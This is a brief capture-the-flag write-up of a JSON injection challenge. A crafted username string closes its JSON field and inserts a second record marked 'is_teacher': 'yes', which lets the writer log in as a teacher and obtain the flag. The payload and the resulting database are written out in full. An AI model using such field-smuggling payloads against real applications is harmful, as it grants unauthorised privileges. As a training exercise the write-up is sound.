# JSON Injection

## Teacher Login 5

```text
JSON Injection Login

Welcome! Can you log in as teacher?

Current Database (users.json)
[]

Add a User
Username:

Login
Username: 
```

The input fields are of **text** type

After adding a couple of users, the db looks like:

```json
[{"username": "user2", "is_teacher": "no"}, {"username": "user", "is_teacher": "no"}]
```

Injecting `"is_teacher: "yes"` through the following payload

```text
user3", "is_teacher": "yes"}, {"username": "user4
```

The result db:

```json
[{"username": "user3", "is_teacher": "yes"}, {"username": "user4", "is_teacher": "no"}, {"username": "user2", "is_teacher": "no"}, {"username": "user", "is_teacher": "no"}]
```

Logging in by "user3" gives the flag
